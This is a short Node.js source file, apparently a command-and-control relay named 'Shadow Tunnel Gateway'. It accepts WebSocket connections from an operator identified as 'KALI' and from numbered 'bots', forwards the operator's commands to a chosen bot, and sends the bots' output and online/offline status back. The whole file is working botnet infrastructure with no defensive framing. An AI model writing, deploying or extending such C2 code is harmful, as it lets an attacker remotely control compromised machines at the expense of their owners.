const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((_, r) => r.end('Shadow Tunnel Gateway Active'));
const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
    if (!id) return ws.close();

    if (id === 'KALI') {
        KALI = ws;
        console.log('[+] Kali Conectado');
        // Sincroniza bots existentes
        BOTS.forEach((_, botId) => KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId })));
    } else {
        BOTS.set(id, ws);
        console.log(`[+] Bot ${id} Online`);
        if (KALI?.readyState === WebSocket.OPEN)
            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id }));
    }

    ws.on('message', (raw) => {
        if (ws === KALI) {
            try {
                const { to, cmd } = JSON.parse(raw);
                const target = BOTS.get(to);
                if (target?.readyState === WebSocket.OPEN) target.send(cmd);
            } catch (e) {}
        } else {
            if (KALI?.readyState === WebSocket.OPEN)
                KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
        }
    });

    ws.on('close', () => {
        if (ws === KALI) {
            KALI = null;
            console.log('[-] Kali Desconectado');
        } else {
            BOTS.delete(id);
            if (KALI?.readyState === WebSocket.OPEN)
                KALI.send(JSON.stringify({ t: 'bot', s: 'off', id }));
        }
    });

    const ping = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) ws.ping();
        else clearInterval(ping);
    }, 25000);
});

server.listen(process.env.PORT || 10000);
